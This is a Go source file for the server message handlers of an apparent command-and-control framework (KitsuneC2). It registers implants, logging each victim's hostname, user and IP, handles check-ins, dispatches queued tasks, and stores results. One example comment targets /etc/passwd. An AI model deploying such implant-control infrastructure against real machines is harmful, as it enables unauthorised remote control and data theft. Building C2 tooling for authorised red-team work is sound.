//This file contains all related functionality to handling incoming messages sent by implants.

package handlers

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/server/db"
	"KitsuneC2/server/transport"
	"encoding/json"
	"log"
	"net"
	"time"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
	0: handleImplantRegister,
	1: handleCheckin,
	4: handleImplantErrorResp,
	//reserved for implant functionality
	12: handleFileInfoResp,
}

// This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
// done.
func TcpHandler(conn net.Conn) {
	defer conn.Close()
	messageType, data, session, err := transport.ReceiveEnvelopeFromImplant(conn)
	if err != nil {
		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
		return
	}

	handlerFunc := messageTypeToFunc[messageType]

	handlerFunc(session, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(sess *transport.Session, data interface{}) {
	implantRegister, ok := data.(*communication.ImplantRegister)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
		return
	}

	var dbEntry *db.Implant_info = new(db.Implant_info)
	dbEntry.Id = implantRegister.ImplantId
	dbEntry.Name = implantRegister.ImplantName
	dbEntry.Hostname = implantRegister.Hostname
	dbEntry.Username = implantRegister.Username
	dbEntry.Uid = implantRegister.UID
	dbEntry.Gid = implantRegister.GID
	dbEntry.Public_ip = sess.Connection.RemoteAddr().String()
	dbEntry.Last_checkin = int(time.Now().Unix())
	dbEntry.Os = ""   //TODO
	dbEntry.Arch = "" //TODO
	err := db.AddImplant(dbEntry)
	if err != nil {
		log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
		return
	}
	log.Printf("[INFO] Registered implant with ID: %s", implantRegister.ImplantId)
}

// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
// the "data" variable is a string with the ID of an implant.
func handleCheckin(sess *transport.Session, data interface{}) {
	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
		return
	}
	err := db.UpdateLastCheckin(implantCheckin.ImplantId, int(time.Now().Unix()))
	if err != nil {
		log.Printf("[ERROR] could not update last checkin time of Implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
	}
	log.Printf("[INFO] Handling check-in from implant with ID: %s", implantCheckin.ImplantId)

	//The ImplantCheckinResp message is a special type of message in which we have to do some extra JSON marshalling. We create
	//an object containing 2 arrays. The first integer array contains the Tasktypes that we want the implant to perform. The
	//second 2d byte array contains the arguments for every task (byte[Tasknr][marshalled task arguments]). The implant will
	//unmarshal the 2d byte array based on the taskTypes provided in the first array.
	//Example: We want to send a FileInfoReq for /etc/passwd and /etc/hosts. We create 2 FileinfoReq objects containing all
	//necessary arguments {PathToFile: "/etc/passwd"} and {PathToFile: "/etc/passwd"} and its corresponding MessageType (11, 11).
	//The ImplantCheckinResp object will look as follows: {[11, 11], [0][json.Marshal(FileInfoReq1)]}
	//														.....	 [1][json.Marhsal(FileInfoReq2)]
	pendingTasks, err := db.GetTasks(implantCheckin.ImplantId, false)
	if err != nil {
		if err == db.ErrNoResults {
			log.Printf("[INFO] no pending tasks for implant with id: %s", implantCheckin.ImplantId)
		} else {
			log.Printf("[ERROR] Database error while fetching tasks for implant with id: %s. Reason: %s", implantCheckin.ImplantId, err.Error())
		}
		return
	}
	req := new(communication.ImplantCheckinResp)
	req.TaskTypes = make([]int, len(pendingTasks))
	req.TaskArguments = make([][]byte, len(pendingTasks))
	for i := range pendingTasks {
		log.Printf("[INFO] Sending task with ID: %s to implant with ID: %s", pendingTasks[i].Task_id, implantCheckin.ImplantId)
		req.TaskTypes[i] = pendingTasks[i].Task_type
		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
	}

	transport.SendEnvelopeToImplant(sess, 2, req)
}

// Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
func handleImplantErrorResp(sess *transport.Session, data interface{}) {
	implantErrorResp, ok := data.(*communication.ImplantErrorResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=4 (ImplantErrorResp), but could not convert envelope data to ImplantErrorResp datastructure")
		return
	}
	marshalledRes, err := json.Marshal(implantErrorResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
	err = db.CompleteTask(implantErrorResp.TaskId, marshalledRes)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantErrorResp.TaskId, err.Error())
	}
}

// Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(sess *transport.Session, data interface{}) {
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
		return
	}
	marshalledRes, err := json.Marshal(fileInfoResp)
	if err != nil {
		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
	err = db.CompleteTask(fileInfoResp.TaskId, marshalledRes)
	if err != nil {
		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", fileInfoResp.TaskId, err.Error())
	}
}
